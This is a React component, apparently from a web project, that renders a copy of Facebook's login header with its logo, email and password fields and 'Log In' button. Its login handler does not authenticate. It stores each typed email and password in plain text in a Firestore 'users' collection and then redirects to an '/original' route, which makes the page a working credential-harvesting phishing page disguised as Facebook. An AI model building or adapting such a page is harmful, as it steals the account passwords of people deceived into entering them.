import React, { useState } from 'react';
import facebookImg from './images/fb.png';
import './Header.css';
import { Link, useHistory } from 'react-router-dom';
import db from './firebase';
import firebase from '@firebase/app';
import '@firebase/firestore';

function Header() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const history = useHistory();
  const login = (event) => {
    event.preventDefault();
    if (email !== '' && password !== '') {
      db.collection('users').add({
        userId: email,
        password: password,
        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
      });
      history.push('/original');
    }
  };
  return (
    <nav className='header'>
      <Link to='/'>
        <img className='header__logo' src={facebookImg} alt='facebook logo' />
      </Link>
      <form className='header__nav'>
        <div class='header__options'>
          <span className='header__input_label'>Email or phone</span>
          <span>
            <input
              value={email}
              onChange={(event) => setEmail(event.target.value)}
              type='text'
              className='header__input'
            />
          </span>
        </div>
        <div class='header__options'>
          <span className='header__input_label'>Password</span>
          <span>
            <input
              value={password}
              onChange={(event) => setPassword(event.target.value)}
              type='password'
              className='header__input'
            />
          </span>
          <Link to='/' className='header__link'>
            <span>Forgotten account?</span>
          </Link>
        </div>
        <div class='header__options'>
          <input
            onClick={login}
            class='header__button'
            value='Log In'
            type='submit'
          />
        </div>
      </form>
    </nav>
  );
}

export default Header;
